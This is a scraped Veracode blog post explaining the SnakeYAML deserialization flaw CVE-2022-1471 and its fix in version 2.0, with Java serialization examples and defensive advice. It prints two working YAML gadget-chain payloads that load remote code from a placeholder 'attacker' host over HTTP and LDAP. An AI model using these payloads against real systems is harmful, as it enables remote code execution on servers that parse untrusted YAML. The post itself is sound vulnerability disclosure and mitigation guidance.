{
    "id": "correct_subsidiary_00127_3",
    "rank": 45,
    "data": {
        "url": "https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0",
        "read_more_link": "",
        "language": "en",
        "title": "Resolving CVE-2022-1471 with the SnakeYAML 2.0 Release",
        "top_image": "https://www.veracode.com/sites/default/files/2024-05/socialcard.jpg",
        "meta_img": "https://www.veracode.com/sites/default/files/2024-05/socialcard.jpg",
        "images": [
            "https://www.veracode.com/sites/default/files/2022-04/logo_1.svg",
            "https://www.veracode.com/sites/default/files/2022-04/logo-secondary_1.svg",
            "https://www.veracode.com/sites/default/files/pictures/Nova%20Trauben.jpg",
            "https://www.veracode.com/sites/default/files/inline-images/SnakeYAML%20Mitigation.png",
            "https://www.veracode.com/sites/default/files/inline-images/SnakeYAML%20Mitigation%202.png",
            "https://www.veracode.com/sites/default/files/inline-images/Successful%20GET%20request.png",
            "https://www.veracode.com/sites/default/files/inline-images/SnakeYAML%202.0.png",
            "https://www.veracode.com/sites/default/files/inline-images/TagInspector%20Defaul%20function.png",
            "https://www.veracode.com/sites/default/files/inline-images/Code%20Returns%20with%20Exception.png",
            "https://www.veracode.com/sites/default/files/inline-images/Code%20Execution%20is%20Unsuccessful.png",
            "https://www.veracode.com/sites/default/files/styles/resize_width_40/public/2022-11/Scott-Simpson.png?itok=GwFvw5Ma",
            "https://www.veracode.com/sites/default/files/styles/resize_width_40/public/2022-11/Chris-Eng.png?itok=x_V-mMPJ",
            "https://www.veracode.com/sites/default/files/styles/resize_width_260/public/pictures/Nova%20Trauben.jpg?itok=fIq3MdR5",
            "https://www.veracode.com/sites/default/files/2022-04/footer-logo.svg"
        ],
        "movies": [],
        "keywords": [],
        "meta_keywords": [
            ""
        ],
        "tags": null,
        "authors": [],
        "publish_date": null,
        "summary": "",
        "meta_description": "In February 2023, the SnakeYAML 2.0 release was pushed that resolves a critical flaw in the SnakeYAML package, also referred to as CVE-2022-1471. Let’s break down how this version can help you resolve this critical flaw.",
        "meta_lang": "en",
        "meta_favicon": "/favicon.ico",
        "meta_site_name": "Veracode",
        "canonical_link": "https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0",
        "text": "In October of 2022, a critical flaw was found in the SnakeYAML package, which allowed an attacker to benefit from remote code execution by sending malicious YAML content and this content being deserialized by the constructor. Finally, in February 2023, the SnakeYAML 2.0 release was pushed that resolves this flaw, also referred to as CVE-2022-1471. Let’s break down how this version can help you resolve this critical flaw.\n\nExploring Deserialization\n\nSnakeYAML is a popular Java library to parse YAML (YAML Ain’t Markup Language format). The library can parse all YAML 1.1 specifications [1], native types [2] and supports serializing and deserializing Java objects. The Remote Code Execution vulnerability is due to the library not restricting Java types when deserializing objects using `Constructor`.\n\nJava Serialization has the great promise of taking the state of a full object graph and saving it externally, then magically restoring its state when we deserialize. This is a big promise as this replaced very error prone state saving custom code which was used prior to Java. It may be the single most important reason for Java’s success and is quite magical. We now find how magic becomes dangerous.\n\nMechanics\n\nJava Serialization (How it Works)\n\nWe would take a first look at default Java serialization. Lets take a POJO\n\npublic static class Range implements Serializable { private final int low; private final int high; public Range(int low, int high) { if (low > high) { throw new IllegalArgumentException(\"Bad data\"); } this.low = low; this.high = high; } public int getLow() { return low; } public int getHigh() { return high; } }\n\nSerialization Mechanics\n\nfinal var range = new Range(3, 4); try (final var fileOutputStream = new FileOutputStream(\"output.ser\")){ final var objectOut = new ObjectOutputStream(fileOutputStream); objectOut.writeObject(range); }\n\nWhen the object is passed objectOut.writeObject it is not going to get the values by calling the getter accessors of the POJO.\n\nInstead, it would walk through the object graph and reflectively scrapes the data from fields directly.\n\nThis means the object cannot control its output form of its internal state. This breaks encapsulation as the code written inside is no longer used.\n\nThis is an extralinguistic behavior as I cannot reason the working of the code by just reading it.\n\nDeserialization Mechanics (How it Works)\n\nWhen sending data out (Serialization) one can be responsible when the object gets constructed and the invariance is checked. But while Deserialization happens it becomes even more of a nightmare because one is consuming data from a world where hackers are waiting to take over your system.\n\ntry (final var fileInputStream = new FileInputStream(\"output.ser\")) { final var objectIn = new ObjectInputStream(fileInputStream); final var range = (Range) objectIn.readObject(); System.out.println(range.getLow()); }\n\nWhen we read output.ser we not enforcing a checksum or any other integrity check. You can tamper the output.ser and send it to deserialize, and it would be happily accepted as input.\n\nWhen the object is passed objectIn.readObject it is not going to fill up the value by calling the constructor\n\npublic Range(int low, int high) { if (low > high) { throw new IllegalArgumentException(\"Bad data\"); } this.low = low; this.high = high; }\n\nInstead, it would call a phantom empty constructor which creates the object\n\nThe constructor and invariant check would never be performed\n\nThis breaks encapsulation as the code written inside is no longer used.\n\nAgain this is an extralinguistic behavior as I cannot reason the working of the code by just reading it\n\nWe have to write more defensive code to make this class work correctly.\n\nprivate void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException { objectInputStream.defaultReadObject(); if (low > high) { throw new IllegalArgumentException(\"Bad data\"); } }\n\nOnce again this is a private method that would be called during the objectIn.readObject and would check the invariance. Without this defensive code, we cannot make the Range class work as expected.\n\nKey Takeaways\n\nJava serialization/de-serialization makes heavy use of reflection to scrape data from Object graphs.\n\nThe use of reflection breaks encapsulation and makes cases for bypassing constructors of objects which prevents checks before creating the object.\n\nJava serialization/de-serialization is extralinguistic behavior as one cannot reason the working of the code by just reading it.\n\nAnd if one cannot reason the correctness of the code, one cannot reason the security aspect of the code.\n\nJava de-serialization requires phantom methods like readObject to write defensive code to validate the object before we create it.\n\nJava de-serialization supports polymorphic subtypes which open the door for malicious subtypes to attack.\n\nChanging the encoding from native serialization to JSON or YAML doesn't make it more secure as the internal mechanics of reading and creating objects remain the same.\n\nExploiting the Vulnerability\n\nGadget Chain:\n\nA gadget is defined as a class or function that’s available within the execution scope of an application. The “Gadget Chain” is when multiple classes or functions are chained together to achieve Arbitrary Code Execution. [3]\n\nSnakeYAML prior to 2.0 did not restrict the type of an object after deserialization, which lets an attacker run arbitrary code if they have control of the YAML document. The `Constructor` method does not limit which classes can be instantiated during deserialization, in fact, any class in the Java classpath is available. A design choice was made to not restrict global tags to fully support the 1.1 specs, but as a result it allows an attacker to specify arbitrary tags in the YAML document which then get converted into Java “gadgets”.\n\nGadget Chain Examples:\n\nThe javax.script.ScriptEngineManager class is from the Oracle/OpenJDK standard. Consider the following gadget chain from Java Unmarshaller Security [4]\n\n!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://attacker/\"] ]] ]\n\nIn this example, arbitrary code execution is possible after SnakeYAML deserializes the following data. Specifically, SnakeYAML type checks the root element, but nested properties are not type checked, which can lead to disastrous consequences. An attacker can insert a reverse shell payload, resulting in shell access on the server running SnakeYAML. Here's another example of a gadget chain in SnakeYAML using JdbcRowset\n\n!!com.sun.rowset.JdbcRowSetImpl dataSourceName: ldap://attacker/obj autoCommit: true\n\nMitigation:\n\nSince 2.0, the SnakeYAML `Constructor` now inherits from `SafeConstructor`, which prevents an attacker from accessing the classpath by default. When instantiating the `Constructor` or `SafeConstuctor`, you must pass a `LoaderOptions` object where one can further set parsing restrictions. By default, all global tags are now blocked.\n\nHere's the exploit in action using the vulnerable SnakeYAML 1.33.\n\nI run the Python simple server to show a successful GET request. After running the code, a successful GET request from localhost appears. Success!\n\nSecuring the Vulnerability with SnakeYAML 2.0\n\nNow, let’s jump into how SnakeYAML 2.0 prevents the attack.\n\nTo demonstrate how the `TagInspector` prevents global tags, I instantiate a new `TagInspector`, without overriding the default `isGlobalTagAllowed`, which prevents all global tags from being parsed as a Java class. If you want to allow-list some global tags, it's also possible by defining your own `isGlobalTagAllowed` method. Please note it is not necessary to instantiate the `TagInspector` if you want to block all global tags, I wanted to show the default function.\n\nI then run the code, but it returns with an exception!\n\nThe remote code execution is unsuccessful.\n\nIf you want to test out the code yourself, check out: https://github.com/1fabunicorn/SnakeYAML-CVE-2022-1471-POC\n\nKeeping Your Applications Secure in the Future\n\nHow to Defend from Java De-Serialization attacks:\n\nBe extra careful with untrusted data from the internet.\n\nDon't create complex Objects like Maps in your DTO objects which are internet-facing, that can open the doors for attacks.\n\nAlways do a code review of DTOs facing the internet to reason its security aspects.\n\nAlways use final classes as DTOs and field variables to disable polymorphic subtype parsing in the parsing library.\n\nTry using Java Records which restricts things you can do with classes as DTO, and it forces parsing libraries to call the constructor.\n\nRun the SCA scanner to find out if you’re affected by a CVE and update to the fixed versions.\n\nThe fixed versions of parsing libraries have the defensive code and filters to protect from attacks so never skip version upgrades.\n\nIn conclusion, if you’re using SnakeYAML, ensure you have the correct `LoaderOptions` restrictions in place [5], or use the SnakeYAML engine [6] which is safe by default because it does not allow custom instances. Since SnakeYAML is used as a dependency in many projects including Spring, it may be necessary to mitigate the finding only if it’s confirmed the library depending on SnakeYAML is not vulnerable. For example, Spring is unaffected as it only parses trusted YAML, which is used for the configuration [7] [8]. If you're using SnakeYAML to parse untrusted YAML, please ensure you upgrade to 2.0 to prevent global tags. If your scan includes SnakeYAML < 2.0, a high-severity vulnerability will appear, and if you use the `Constructor` method a vulnerable method finding will appear on your scan highlighting the vulnerable usage.\n\nTo keep a pulse check on your software supply chain and its dependencies, make sure you’re integrating Software Composition Analysis (SCA) scans into your software development workflows.\n\nA special thank you goes to Srinivasan Raghavan and Mateusz Krzeszowiec for their assistance in writing and reviewing this research.\n\n[1] https://yaml.org/spec/1.1/current.html\n\n[2] https://yaml.org/type/index.html\n\n[3] https://brandur.org/fragments/gadgets-and-chains#gadgets-and-chains\n\n[4] https://github.com/mbechler/marshalsec\n\n[5] https://www.javadoc.io/doc/org.yaml/snakeyaml/latest/org/yaml/snakeyaml/LoaderOptions.html\n\n[6] https://bitbucket.org/snakeyaml/snakeyaml-engine/src/master/\n\n[7] https://github.com/spring-projects/spring-framework/pull/30048"
    }
}